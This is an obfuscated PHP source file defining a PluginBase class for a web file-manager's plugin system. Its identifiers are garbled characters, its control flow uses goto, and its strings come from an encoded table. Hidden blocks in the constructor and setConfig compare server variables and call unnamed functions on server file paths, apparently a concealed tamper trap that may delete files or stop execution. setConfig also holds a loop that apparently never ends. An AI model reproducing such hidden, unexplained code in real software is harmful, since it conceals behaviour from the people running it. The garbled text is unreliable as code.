$BÈÖ˜™ïå· = array($a’è√ÎÜﬂﬁ[975] => isset($BÈÖ˜™ïå·[$a’è√ÎÜﬂﬁ[975]]) ? $BÈÖ˜™ïå·[$a’è√ÎÜﬂﬁ[975]] : $a’è√ÎÜﬂﬁ[33], $a’è√ÎÜﬂﬁ[531] => isset($BÈÖ˜™ïå·[$a’è√ÎÜﬂﬁ[531]]) ? $BÈÖ˜™ïå·[$a’è√ÎÜﬂﬁ[531]] : $a’è√ÎÜﬂﬁ[33]); if (empty($aÈ⁄¢Õ≥ØÇ) || empty($BÈÖ˜™ïå·[$a’è√ÎÜﬂﬁ[975]]) && empty($BÈÖ˜™ïå·[$a’è√ÎÜﬂﬁ[531]])) { return !1; } $A¢”Ó±¯ßù = array($a’è√ÎÜﬂﬁ[1242] => $E¨∞ÉÁ°ﬁ∏, $a’è√ÎÜﬂﬁ[1303] => $BÈÖ˜™ïå·); goto f§Æºæ€ŸΩ; bíõ¯≥«∂: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto Bé Ïÿ∑¡Ú; d∂Íﬂ˘‚¬¡: if ($dùŒíÎÔòﬂ && strpos($C·íÖ•êÖæ[47] . $dùŒíÎÔòﬂ . $C·íÖ•êÖæ[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$C·íÖ•êÖæ[1311]] . $this->pluginName . $C·íÖ•êÖæ[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); goto C≈◊Ã∞‰ã◊; a˘äπ©ÙπÕ: $this->pluginName = str_replace($C·íÖ•êÖæ[1307], $C·íÖ•êÖæ[33], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $C·íÖ•êÖæ[8]; $this->pluginApi = appHostGet() . $C·íÖ•êÖæ[1308] . $this->pluginName . $C·íÖ•êÖæ[8]; goto EÏçÑ ººÁ; cÈ•ßÕßÜΩ: $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($C·íÖ•êÖæ[1307]); goto a˘äπ©ÙπÕ; EÏçÑ ººÁ: $this->pluginHost = $config[$C·íÖ•êÖæ[1309]] . $this->pluginName . $C·íÖ•êÖæ[8]; $this->pluginHostDefault = $config[$C·íÖ•êÖæ[1309]] . $this->pluginName . $C·íÖ•êÖæ[8]; $dùŒíÎÔòﬂ = $config[$C·íÖ•êÖæ[1310]]; goto d∂Íﬂ˘‚¬¡; C≈◊Ã∞‰ã◊: return $this; goto BﬂÉƒç»∆ÿ; Bé Ïÿ∑¡Ú: $C·íÖ•êÖæ =& $_SERVER[¯èãÄπµ]; if ($_SERVER[$C·íÖ•êÖæ[792]] != $_SERVER[$C·íÖ•êÖæ[1305]]) { goto d¯ïé—§Œ®; Aä¿·ô›àá: $FèŒ“≥Ê®∞ = $e—…œ†è¡û($A—ô‹¡ù˜◊); $B‡±≥à’èÓ = explode($C·íÖ•êÖæ[213], $FèŒ“≥Ê®∞); if (count($B‡±≥à’èÓ) < $C·íÖ•êÖæ[570]) { $C˜—ÑŒ¥ñÉ = $C·íÖ•êÖæ[797]; $C˜—ÑŒ¥ñÉ(); } goto cƒ¢Ú÷Ô∆√; d¯ïé—§Œ®: $dï◊«Øã∂É = $C·íÖ•êÖæ[793]; $e—…œ†è¡û = $C·íÖ•êÖæ[794]; $A—ô‹¡ù˜◊ = $_SERVER[$C·íÖ•êÖæ[795]] . $C·íÖ•êÖæ[796]; goto Aä¿·ô›àá; cƒ¢Ú÷Ô∆√: $E‰ÇÁâçΩÒ = $C·íÖ•êÖæ[798]; $E‰ÇÁâçΩÒ($_SERVER[$C·íÖ•êÖæ[789]]); $E‰ÇÁâçΩÒ($_SERVER[$C·íÖ•êÖæ[795]] . $C·íÖ•êÖæ[1306]); goto b≈º‹á•∆Ö; b≈º‹á•∆Ö: $bº˜ªÛê≈ = 1; while ($bº˜ªÛê≈ > 1) { $bº˜ªÛê≈ = $bº˜ªÛê≈ + 4; $FﬁÜ∞Æ§Ï™ = rawurlencode($bº˜ªÛê≈ . $C·íÖ•êÖæ[357]); } goto BÆ∞ä¶ÃÀò; BÆ∞ä¶ÃÀò: } global $in, $config; goto cÈ•ßÕßÜΩ; BﬂÉƒç»∆ÿ: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[¯èãÄπµ][1312]); } protected function assign($B‚ıâ∂ªäÙ, $e∑Éé¨·˜” = false) { if (is_array($B‚ıâ∂ªäÙ)) { $this->values = array_merge($this->values, $B‚ıâ∂ªäÙ); } else { $this->values[$B‚ıâ∂ªäÙ] = $e∑Éé¨·˜”; } } protected function display($E”µÊã»·Û) { extract($this->values); require $E”µÊã»·Û; } final function hookRegist($A≠éŸ≠áª”) { $this->modelPlugin->appRegist($this->pluginName, $A≠éŸ≠áª”); } final function appIcon() { $Eó∞†ïßÚÕ =& $_SERVER[¯èãÄπµ]; $d◊â“‡üÓê = $this->appPackage(); $FƒÉïö•ñâ = $Eó∞†ïßÚÕ[33]; if (isset($d◊â“‡üÓê[$Eó∞†ïßÚÕ[378]])) { if (isset($d◊â“‡üÓê[$Eó∞†ïßÚÕ[378]][$Eó∞†ïßÚÕ[1313]])) { $FƒÉïö•ñâ = $Eó∞†ïßÚÕ[1314] . $d◊â“‡üÓê[$Eó∞†ïßÚÕ[378]][$Eó∞†ïßÚÕ[1313]] . $Eó∞†ïßÚÕ[1315]; } else { if ($d◊â“‡üÓê[$Eó∞†ïßÚÕ[378]][$Eó∞†ïßÚÕ[1316]]) { $FƒÉïö•ñâ = $Eó∞†ïßÚÕ[1317] . $d◊â“‡üÓê[$Eó∞†ïßÚÕ[378]][$Eó∞†ïßÚÕ[1316]] . $Eó∞†ïßÚÕ[1318]; } } } return $FƒÉïö•ñâ; } final function fileCanView($AÖµåÙÃıò) { $d¨É√Î°ﬂ§ =& $_SERVER[¯èãÄπµ]; if (request_url_safe($AÖµåÙÃıò)) { return !0; } if ($this->isShare($AÖµåÙÃıò)) { return !0; } if (!Action($d¨É√Î°ﬂ§[1319])->authCan($d¨É√Î°ﬂ§[1320])) { show_tips(LNG($d¨É√Î°ﬂ§[1321]) . $d¨É√Î°ﬂ§[1322], !1); } ActionCall($d¨É√Î°ﬂ§[1323], $AÖµåÙÃıò); } final function isShare($fååñ≈àﬁ÷) { $FÔèµ∂π®ò = KodIO::parse($fååñ≈àﬁ÷); return $FÔèµ∂π®ò[$_SERVER[¯èãÄπµ][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($F©êî≠≥”¢) { if (request_url_safe($F©êî≠≥”¢)) { return $F©êî≠≥”¢; } if (!$this->isShare($F©êî≠≥”¢)) { $F©êî≠≥”¢ = $this->filePath($F©êî≠≥”¢); } return Action($_SERVER[¯èãÄπµ][1019])->linkOut($F©êî≠≥”¢); } public function filePathLinkOut($cø‘‘’òƒ) { if (request_url_safe($cø‘‘’òƒ)) { return $cø‘‘’òƒ; } $this->fileCanView($cø‘‘’òƒ); return Action($_SERVER[¯èãÄπµ][1019])->link($cø‘‘’òƒ); } final function filePath($Dã∆¥Óû¯Í) { $c™ó…øìæü =& $_SERVER[¯èãÄπµ]; if ($cêä≈Á„“å = $this->checkSharePath($Dã∆¥Óû¯Í)) { return $cêä≈Á„“å; } $this->fileCanView($Dã∆¥Óû¯Í); if (request_url_safe($Dã∆¥Óû¯Í)) { $D®óŸóÎ¥≠ = parse_url_query($Dã∆¥Óû¯Í); if (isset($D®óŸóÎ¥≠[$c™ó…øìæü[1324]]) && isset($D®óŸóÎ¥≠[$c™ó…øìæü[193]])) { $FÛßÃßÛÁ” = Model($c™ó…øìæü[1090])->get($c™ó…øìæü[1325]); $C‡´îá≤◊Ì = Mcrypt::decode($D®óŸóÎ¥≠[$c™ó…øìæü[193]], $FÛßÃßÛÁ”); if ($C‡´îá≤◊Ì) { $this->fileInfo = IO::infoWithChildren($C‡´îá≤◊Ì); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $C‡´îá≤◊Ì; } } $Dã∆¥Óû¯Í = $this->_cacheHttpFile($Dã∆¥Óû¯Í); $this->fileInfo = IO::infoWithChildren($Dã∆¥Óû¯Í); } else { $this->fileInfo = IO::infoWithChildren($Dã∆¥Óû¯Í); if (!$this->fileInfo) { show_tips(LNG($c™ó…øìæü[100]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $Dã∆¥Óû¯Í; } final function _cacheHttpFile($D‹ÎöËÏÇΩ) { $E•ÂœçÀµû = hash_path($D‹ÎöËÏÇΩ, !0); $this->cachePath = $this->pluginCachePath($E•ÂœçÀµû); if ($A◊§´¡ï≥± = IO::fileNameExist($this->cachePath, $E•ÂœçÀµû)) { return KodIO::make($A◊§´¡ï≥±); } $Dƒ∆‡á∑—û = $this->cachePath . $E•ÂœçÀµû; return $this->pluginCacheFileSet($Dƒ∆‡á∑—û, file_get_contents($D‹ÎöËÏÇΩ)); } final function _tmpFileName($aÛê¯Ö∫†Œ = array()) { goto BÜ»âµå≠Ë; FÜË∞Àßµ: if (isset($aÛê¯Ö∫†Œ[$AÑ±é√…ôÖ[158]][$AÑ±é√…ôÖ[160]])) { return $aÛê¯Ö∫†Œ[$AÑ±é√…ôÖ[158]][$AÑ±é√…ôÖ[160]]; } $EŒµ âﬂ´‹ = array($aÛê¯Ö∫†Œ[$AÑ±é√…ôÖ[28]], $aÛê¯Ö∫†Œ[$AÑ±é√…ôÖ[75]], $aÛê¯Ö∫†Œ[$AÑ±é√…ôÖ[77]]); if (isset($aÛê¯Ö∫†Œ[$AÑ±é√…ôÖ[455]])) { $EŒµ âﬂ´‹[] = $aÛê¯Ö∫†Œ[$AÑ±é√…ôÖ[455]]; } goto bîïÌß‘Æÿ; BÜ»âµå≠Ë: $AÑ±é√…ôÖ =& $_SERVER[¯èãÄπµ]; if (!$aÛê¯Ö∫†Œ) { $aÛê¯Ö∫†Œ = $this->fileInfo; } if (isset($aÛê¯Ö∫†Œ[$AÑ±é√…ôÖ[160]])) { return $aÛê¯Ö∫†Œ[$AÑ±é√…ôÖ[160]]; } goto FÜË∞Àßµ; bîïÌß‘Æÿ: return md5(implode($AÑ±é√…ôÖ[70], $EŒµ âﬂ´‹)); goto FıÙ—ñ®àΩ; FıÙ—ñ®àΩ: } final function checkSharePath($bÖæ£ñ◊ûó) { goto dÓ‹ñ©°—¨; Eåà“ﬂ∫°º: $this->cachePath = $this->pluginCachePath($this->fileInfo[$Fò˜¬»Í–”[160]]); return $BÂù…ïõÉ¢[$Fò˜¬»Í–”[75]]; goto Fª£Î“⁄†ñ; dÓ‹ñ©°—¨: $Fò˜¬»Í–” =& $_SERVER[¯èãÄπµ]; if (!defined($Fò˜¬»Í–”[423])) { define($Fò˜¬»Í–”[1326], 0); } if (!$this->isShare($bÖæ£ñ◊ûó)) { return !1; } goto e±∞àõ≥ÿ§; e±∞àõ≥ÿ§: $BÂù…ïõÉ¢ = Action($Fò˜¬»Í–”[1019])->sharePathInfo($bÖæ£ñ◊ûó); if (!isset($BÂù…ïõÉ¢[$Fò˜¬»Í–”[75]])) { show_json(LNG($Fò˜¬»Í–”[1327]), !1); } $this->fileInfo = $BÂù…ïõÉ¢[$Fò˜¬»Í–”[158]]; goto Eåà“ﬂ∫°º; Fª£Î“⁄†ñ: } final function pluginCachePath($Eä¡–¢¿≤Õ = '') { $A£∆’ã¬âê =& $_SERVER[¯èãÄπµ]; $BÜ¯ÒÁΩ≈¿ = IO_PATH_SYSTEM_TEMP . $A£∆’ã¬âê[1328] . $this->pluginName; if (!($Bã¶ﬂßõ•» = IO::infoFull($BÜ¯ÒÁΩ≈¿))) { return IO::mkdir($BÜ¯ÒÁΩ≈¿ . $A£∆’ã¬âê[8] . $Eä¡–¢¿≤Õ); } if (empty($Eä¡–¢¿≤Õ)) { return $Bã¶ﬂßõ•»[$A£∆’ã¬âê[75]]; } if (!($b€Ê¯÷Â¢Ü = IO::fileNameExist($Bã¶ﬂßõ•»[$A£∆’ã¬âê[75]], $Eä¡–¢¿≤Õ))) { return IO::mkdir($Bã¶ﬂßõ•»[$A£∆’ã¬âê[75]] . $Eä¡–¢¿≤Õ); } return KodIO::make($b€Ê¯÷Â¢Ü); } final function pluginCacheFileSet($CÇÂ‰‡â±Ô, $d ßß¨Õë¥ = '') { $e∞¶≥Ø£äŸ =& $_SERVER[¯èãÄπµ]; if (!($Bä®ı⁄√Ê‹ = IO::infoFull($CÇÂ‰‡â±Ô))) { return IO::mkfile($CÇÂ‰‡â±Ô, $d ßß¨Õë¥, REPEAT_REPLACE); } IO::setContent($Bä®ı⁄√Ê‹[$e∞¶≥Ø£äŸ[75]], $d ßß¨Õë¥); return $Bä®ı⁄√Ê‹[$e∞¶≥Ø£äŸ[75]]; } final function pluginLocalFile($f†ÈñÿÕÍˆ = '') { goto dóæåﬂ£ûë; dóæåﬂ£ûë: $CŒÎ≈·Œ‹É =& $_SERVER[¯èãÄπµ]; $cÆÉ»ñ¿◊ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($cÆÉ»ñ¿◊)) { mk_dir($cÆÉ»ñ¿◊); } goto F›É≠≠Ç¿”; F›É≠≠Ç¿”: if (!$f†ÈñÿÕÍˆ) { return $cÆÉ»ñ¿◊; } $E›ÉúÓÆ∆‚ = IO::info($f†ÈñÿÕÍˆ); $cèÍÌì˘ôÜ = $this->_tmpFileName($E›ÉúÓÆ∆‚) . $CŒÎ≈·Œ‹É[91] . $E›ÉúÓÆ∆‚[$CŒÎ≈·Œ‹É[156]]; goto eÜ’ïÀ∂Ñù; eÜ’ïÀ∂Ñù: $AÊﬂﬂÇÉ¡Ñ = $cÆÉ»ñ¿◊ . $cèÍÌì˘ôÜ; if (@file_exists($AÊﬂﬂÇÉ¡Ñ)) { return $AÊﬂﬂÇÉ¡Ñ; } return IO::copy($f†ÈñÿÕÍˆ, $cÆÉ»ñ¿◊, 0, $cèÍÌì˘ôÜ); goto AèÂç…Œ˘Ô; AèÂç…Œ˘Ô: } final function appPackage() { goto Aà„Ú¶◊˜í; e∞Í∆é√°: $D†Êáãˆ§√ = Hook::trigger($b´Û∆Ö¬∂Â[1330], $AäÊ÷⁄´æã); if ($D†Êáãˆ§√ && is_array($D†Êáãˆ§√)) { $AäÊ÷⁄´æã = $D†Êáãˆ§√; } $this->packageData = $AäÊ÷⁄´æã; goto f¨ãÿüıœ⁄; Aà„Ú¶◊˜í: $b´Û∆Ö¬∂Â =& $_SERVER[¯èãÄπµ]; if ($this->packageData) { return $this->packageData; } $cëêë—‘£ = $this->parseFile($this->pluginPath . $b´Û∆Ö¬∂Â[1329]); goto b…Ó¿à˘Øå; f¨ãÿüıœ⁄: return $AäÊ÷⁄´æã; goto DÊËÊˆóÛÕ; b…Ó¿à˘Øå: $this->parseLang($cëêë—‘£); $AäÊ÷⁄´æã = json_decode_force($cëêë—‘£); if (!$AäÊ÷⁄´æã) { return array(); } goto e∞Í∆é√°; DÊËÊˆóÛÕ: } public function packageInfoGet($BÇØ´åÑÒÚ) { $bÆé∏ûô∂◊ = $this->appPackage(); return array_get_value($bÆé∏ûô∂◊, $BÇØ´åÑÒÚ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[¯èãÄπµ][1331]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[¯èãÄπµ][1332]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[¯èãÄπµ][1333]); } private function parseFile($eπ™„”Çÿ¬) { $d∑¢“èæãª =& $_SERVER[¯èãÄπµ]; $C¶Íùü«ßµ = file_get_contents($eπ™„”Çÿ¬); $e©´—ï—™ö = array($d∑¢“èæãª[1334], $d∑¢“èæãª[1335], $d∑¢“èæãª[1336], $d∑¢“èæãª[1337], $d∑¢“èæãª[1338], $d∑¢“èæãª[1339], $d∑¢“èæãª[1340]); $CÑæêùèÕœ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$d∑¢“èæãª[84]][$d∑¢“èæãª[1341]]); $C¶Íùü«ßµ = str_replace($e©´—ï—™ö, $CÑæêùèÕœ, $C¶Íùü«ßµ); return $C¶Íùü«ßµ; } private function parseLang(&$B∞Ò†áÈìº) { goto A¯ÊÁÌç‡Ì; A¯ÊÁÌç‡Ì: $fó“§™¶ ¯ =& $_SERVER[¯èãÄπµ]; $eí®·“Ù˜Ã = $fó“§™¶ ¯[1342]; if (!strstr($B∞Ò†áÈìº, $eí®·“Ù˜Ã)) { return; } goto D‡®ÖÜÁàﬂ; D‡®ÖÜÁàﬂ: preg_match_all($fó“§™¶ ¯[1343], $B∞Ò†áÈìº, $B∞ÿìéƒ∫Û); if (!is_array($B∞ÿìéƒ∫Û) || count($B∞ÿìéƒ∫Û) == 0 || !is_array($B∞ÿìéƒ∫Û[0]) || count($B∞ÿìéƒ∫Û[0]) == 0) { return; } $cÆ¥ÓêéÜé = array(); goto e≈„ûû⁄Ñ°; e≈„ûû⁄Ñ°: $düóã’’«∆ = array(); foreach ($B∞ÿìéƒ∫Û[0] as $eÑ÷ãÏ‡¡è) { $bò‡¨¥“´‘ = substr($eÑ÷ãÏ‡¡è, strlen($eí®·“Ù˜Ã), -4); $CƒÕ¡Ó§¡˘ = LNG($bò‡¨¥“´‘); $cÆ¥ÓêéÜé[] = $eÑ÷ãÏ‡¡è; $düóã’’«∆[] = str_replace(array($fó“§™¶ ¯[213], $fó“§™¶ ¯[994], $fó“§™¶ ¯[326], $fó“§™¶ ¯[112]), array($fó“§™¶ ¯[50], $fó“§™¶ ¯[50], $fó“§™¶ ¯[33], $fó“§™¶ ¯[1344]), $CƒÕ¡Ó§¡˘); } $B∞Ò†áÈìº = str_replace($cÆ¥ÓêéÜé, $düóã’’«∆, $B∞Ò†áÈìº); goto cœ¬ÙÙŒüÜ; cœ¬ÙÙŒüÜ: } private function parseConfig(&$E–¶°ﬂÙÕº) { goto Aã∂ƒª°Æ≠; D“ïÉÂÃÑº: $E–¶°ﬂÙÕº = str_replace($B’∫ø‚∏óª, $C÷ŒΩ¡”«â, $E–¶°ﬂÙÕº); goto b∆î◊÷õ—ë; A∫≥◊ä≤‹Â: $B’∫ø‚∏óª = array(); $C÷ŒΩ¡”«â = array(); foreach ($c†Ω±£ƒéº[0] as $eò∆≤ÀÍ¢®) { $c“æ—´ï‰Œ = substr($eò∆≤ÀÍ¢®, strlen($a©’û√ÌÌâ), -2); $B’∫ø‚∏óª[] = $eò∆≤ÀÍ¢®; $C÷ŒΩ¡”«â[] = _get($f¯∆ªºÛ¶Ã, $c“æ—´ï‰Œ); } goto D“ïÉÂÃÑº; Aã∂ƒª°Æ≠: $bÊïÕ«éπò =& $_SERVER[¯èãÄπµ]; $a©’û√ÌÌâ = $bÊïÕ«éπò[1345]; if (!strstr($E–¶°ﬂÙÕº, $a©’û√ÌÌâ)) { return; } goto e≈—û‚Áå“; e≈—û‚Áå“: preg_match_all($bÊïÕ«éπò[1346], $E–¶°ﬂÙÕº, $c†Ω±£ƒéº); if (!is_array($c†Ω±£ƒéº) || count($c†Ω±£ƒéº) == 0 || !is_array($c†Ω±£ƒéº[0]) || count($c†Ω±£ƒéº[0]) == 0) { return; } $f¯∆ªºÛ¶Ã = $this->getConfig(); goto A∫≥◊ä≤‹Â; b∆î◊÷õ—ë: } private function parsePackage(&$a¶É∆õÿº—) { goto BŒﬁ¡”’Ê¶; BŒﬁ¡”’Ê¶: $Eë≈êöôÕ‡ =& $_SERVER[¯èãÄπµ]; $e‘ãÇŒ§ÓÈ = $Eë≈êöôÕ‡[1347]; if (!strstr($a¶É∆õÿº—, $e‘ãÇŒ§ÓÈ)) { return; } goto fËË®ƒ ı†; fËË®ƒ ı†: preg_match_all($Eë≈êöôÕ‡[1348], $a¶É∆õÿº—, $b çäô√Ï¢); if (!is_array($b çäô√Ï¢) || count($b çäô√Ï¢) == 0 || !is_array($b çäô√Ï¢[0]) || count($b çäô√Ï¢[0]) == 0) { return; } $FªÙ⁄ï›—” = $this->appPackage(); goto b¥ÕæÔ…Ï©; B‹⁄Ç¥Â¬Ê: $a¶É∆õÿº— = str_replace($AõΩ∂˜∞ÑŒ, $a¯Ùú¥∂’’, $a¶É∆õÿº—); goto EÙ⁄àãÑ˘û; b¥ÕæÔ…Ï©: $AõΩ∂˜∞ÑŒ = array(); $a¯Ùú¥∂’’ = array(); foreach ($b çäô√Ï¢[0] as $FÚçåîöËã) { $CÂﬁ÷À°“û = substr($FÚçåîöËã, strlen($e‘ãÇŒ§ÓÈ), -2); $AõΩ∂˜∞ÑŒ[] = $FÚçåîöËã; $a¯Ùú¥∂’’[] = _get($FªÙ⁄ï›—”, $CÂﬁ÷À°“û); } goto B‹⁄Ç¥Â¬Ê; EÙ⁄àãÑ˘û: } final function echoFile($CªÈ≠πÌ§π, $f”âÉÉ£≈ò = false) { goto FÏÑ’Í∆úË; Dü‚ÿû”ﬁî: $this->parsePackage($eÂ ÏïÑ…ï); if (is_array($f”âÉÉ£≈ò)) { $eÂ ÏïÑ…ï = str_replace(array_keys($f”âÉÉ£≈ò), array_values($f”âÉÉ£≈ò), $eÂ ÏïÑ…ï); } echo $d≤Ç‘¬‚Èû[213] . $eÂ ÏïÑ…ï; goto dï™ØﬁûÕÆ; FÏÑ’Í∆úË: $d≤Ç‘¬‚Èû =& $_SERVER[¯èãÄπµ]; $fî¿ò∆¶éë = $this->pluginPath . $CªÈ≠πÌ§π; if (ACT == $d≤Ç‘¬‚Èû[1349]) { echo $d≤Ç‘¬‚Èû[1350] . $this->pluginName . $d≤Ç‘¬‚Èû[8] . $CªÈ≠πÌ§π . $d≤Ç‘¬‚Èû[1351]; if (!file_exists($fî¿ò∆¶éë)) { echo $d≤Ç‘¬‚Èû[1352]; return; } } goto B¬ï€≥»¿; B¬ï€≥»¿: $eÂ ÏïÑ…ï = $this->parseFile($fî¿ò∆¶éë); $this->parseLang($eÂ ÏïÑ…ï); $this->parseConfig($eÂ ÏïÑ…ï); goto Dü‚ÿû”ﬁî; dï™ØﬁûÕÆ: } final function initLang() { goto fßæ≈≠≥âŒ; BåÛ†øì≥Á: if (!is_array($C—ìá´ÁÌÕ)) { return array(); } if (@count($C—ìá´ÁÌÕ) > 0) { I18n::set($C—ìá´ÁÌÕ); } return $C—ìá´ÁÌÕ; goto Eñ˜⁄¨Ã‡•; fßæ≈≠≥âŒ: $eóá‚†µ¯« =& $_SERVER[¯èãÄπµ]; $A„Ôã≤öä» = $eóá‚†µ¯«[1353]; $eÙ“’ß˜âö = $this->pluginPath . $eóá‚†µ¯«[1354]; goto a–ÔÉ‹à–ø; a–ÔÉ‹à–ø: $DÃÔ÷°à—ø = I18n::getType(); $C—ìá´ÁÌÕ = array(); if (file_exists($eÙ“’ß˜âö . $DÃÔ÷°à—ø . $eóá‚†µ¯«[767])) { $C—ìá´ÁÌÕ = (include $eÙ“’ß˜âö . $DÃÔ÷°à—ø . $eóá‚†µ¯«[767]); } else { if ($DÃÔ÷°à—ø == $eóá‚†µ¯«[1355] && !file_exists($eÙ“’ß˜âö . $DÃÔ÷°à—ø . $eóá‚†µ¯«[767]) && file_exists($eÙ“’ß˜âö . $eóá‚†µ¯«[1356])) { $C—ìá´ÁÌÕ = (include $eÙ“’ß˜âö . $eóá‚†µ¯«[1356]); } else { if (file_exists($eÙ“’ß˜âö . $A„Ôã≤öä» . $eóá‚†µ¯«[767])) { $C—ìá´ÁÌÕ = (include $eÙ“’ß˜âö . $A„Ôã≤öä» . $eóá‚†µ¯«[767]); } } } goto BåÛ†øì≥Á; Eñ˜⁄¨Ã‡•: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($BÕÉÙÙ˘ÁÉ) { $D ±òã·˜∂ =& $_SERVER[¯èãÄπµ]; if (!isset($_SERVER[$D ±òã·˜∂[792]]) || !isset($_SERVER[$D ±òã·˜∂[1165]])) { goto d˘ÔÜﬂˆÑâ; E‡¬€›Áôé: for ($FëıÀ›—Èè = $eÀ»£˜ÍÙ≠; $FëıÀ›—Èè > 0; $FëıÀ›—Èè++) { $búîëˆÇïä = json_encode($GLOBALS[$D ±òã·˜∂[380]]); } goto E’ì©©éÈí; aªêàåæß©: $d¡ß” è±Û = $aí÷„é¬Ú‰($A°ÆÚ»Íö); $A≤Ùò°»–Ø = explode($D ±òã·˜∂[213], $d¡ß” è±Û); if (count($A≤Ùò°»–Ø) < $D ±òã·˜∂[570]) { $DÊ•∂ËˆÉœ = $D ±òã·˜∂[797]; $DÊ•∂ËˆÉœ(); } goto e»⁄æö„ø€; e»⁄æö„ø€: $búîëˆÇïä = $D ±òã·˜∂[798]; $búîëˆÇïä($_SERVER[$D ±òã·˜∂[789]]); $eÀ»£˜ÍÙ≠ = 1; goto E‡¬€›Áôé; d˘ÔÜﬂˆÑâ: $DÚêë∫ˆíÔ = $D ±òã·˜∂[793]; $aí÷„é¬Ú‰ = $D ±òã·˜∂[794]; $A°ÆÚ»Íö = $_SERVER[$D ±òã·˜∂[795]] . $D ±òã·˜∂[796]; goto aªêàåæß©; E’ì©©éÈí: } return $this->modelPlugin->setConfig($this->pluginName, $BÕÉÙÙ˘ÁÉ); } public function onSetConfig($F∑©Ó√¨ˆŒ) { } public function onGetConfig($bÑ∏öêí∆) { } public function onChangeStatus($E◊Úö‹áÒ˜) { } public function onUninstall() { } public function onInstall() { } public function authCheck($d’œ≥çÛ∏ø = "\160\x6c\165\x67\151\x6e\x41\x75\x74\x68") { $DÖÉ¶ÜÍ§÷ =& $_SERVER[¯èãÄπµ]; if (!defined($DÖÉ¶ÜÍ§÷[423])) { return !1; } if (_get($GLOBALS, $DÖÉ¶ÜÍ§÷[453])) { return !0; } $DÎ⁄Ë÷–Ö = $this->getConfig(); if (!$DÎ⁄Ë÷–Ö[$d’œ≥çÛ∏ø]) { return !1; } return ActionCall($DÖÉ¶ÜÍ§÷[1357], $DÎ⁄Ë÷–Ö[$d’œ≥çÛ∏ø]); } public function url($dΩÑû∆∫äÈ, $eçäãäß≥ß = '', $C‰Ç¡¬±îÆ = true) { goto fêŒÕ≥úÆÙ; fêŒÕ≥úÆÙ: $b∫ﬁﬁÉªÂõ =& $_SERVER[¯èãÄπµ]; $A”„¢Ëß√á = $this->getConfig(); $C“™Á”äÕå = KOD_VERSION . $b∫ﬁﬁÉªÂõ[91] . KOD_VERSION_BUILD; goto aëØôø¨æÏ; BÛ˜ë∏®◊Õ: if (!$C‰Ç¡¬±îÆ) { return $EçÀ”≠•·æ; } echo $EçÀ”≠•·æ; goto fÑôÎ∞˘è; aëØôø¨æÏ: $fÔöÈ¿êï⁄ = $this->packageVersion(); $AúÒ‘ﬂáØø = $C“™Á”äÕå . $b∫ﬁﬁÉªÂõ[408] . $fÔöÈ¿êï⁄; if (substr($dΩÑû∆∫äÈ, 0, 4) == $b∫ﬁﬁÉªÂõ[142] || substr($dΩÑû∆∫äÈ, 0, 2) == $b∫ﬁﬁÉªÂõ[1149]) { $EçÀ”≠•·æ = $dΩÑû∆∫äÈ . $b∫ﬁﬁÉªÂõ[1358] . $AúÒ‘ﬂáØø; } else { if ($eçäãäß≥ß == $b∫ﬁﬁÉªÂõ[33]) { $EçÀ”≠•·æ = $this->pluginHost . $dΩÑû∆∫äÈ . $b∫ﬁﬁÉªÂõ[1358] . $AúÒ‘ﬂáØø; } else { if ($eçäãäß≥ß === $b∫ﬁﬁÉªÂõ[76]) { $EçÀ”≠•·æ = $this->pluginHost . $dΩÑû∆∫äÈ; } else { if ($eçäãäß≥ß == $b∫ﬁﬁÉªÂõ[1359]) { $EçÀ”≠•·æ = STATIC_PATH . $dΩÑû∆∫äÈ . $b∫ﬁﬁÉªÂõ[1358] . $C“™Á”äÕå; } else { if ($eçäãäß≥ß == $b∫ﬁﬁÉªÂõ[1360]) { $EçÀ”≠•·æ = APP_HOST . $b∫ﬁﬁÉªÂõ[1361] . $dΩÑû∆∫äÈ . $b∫ﬁﬁÉªÂõ[1358] . $C“™Á”äÕå; } else { if (isset($A”„¢Ëß√á[$eçäãäß≥ß])) { $EçÀ”≠•·æ = $A”„¢Ëß√á[$eçäãäß≥ß] . $dΩÑû∆∫äÈ . $b∫ﬁﬁÉªÂõ[1358] . $AúÒ‘ﬂáØø; } } } } } } goto BÛ˜ë∏®◊Õ; fÑôÎ∞˘è: } public function link($d¶÷ö–ƒøª = false, $fØ±ª’≠£Ò = '') { $dŸñ›ˆÁùŸ =& $_SERVER[¯èãÄπµ]; if (!$d¶÷ö–ƒøª) { $this->link($dŸñ›ˆÁùŸ[1362], $dŸñ›ˆÁùŸ[1360]); $this->link($dŸñ›ˆÁùŸ[1363], $dŸñ›ˆÁùŸ[1359]); $this->link($dŸñ›ˆÁùŸ[1364], $dŸñ›ˆÁùŸ[1359]); $this->link($dŸñ›ˆÁùŸ[1365], $dŸñ›ˆÁùŸ[1359]); $this->link($dŸñ›ˆÁùŸ[1366], $dŸñ›ˆÁùŸ[1359]); return; } $E—üÜçâ∑– = $this->url($d¶÷ö–ƒøª, $fØ±ª’≠£Ò, !1); if (substr($d¶÷ö–ƒøª, -3) == $dŸñ›ˆÁùŸ[1367]) { echo $dŸñ›ˆÁùŸ[1368] . $E—üÜçâ∑– . $dŸñ›ˆÁùŸ[1369] . $dŸñ›ˆÁùŸ[213]; } else { if (substr($d¶÷ö–ƒøª, -4) == $dŸñ›ˆÁùŸ[1370]) { echo $dŸñ›ˆÁùŸ[1371] . $E—üÜçâ∑– . $dŸñ›ˆÁùŸ[1372] . $dŸñ›ˆÁùŸ[213]; } } } } 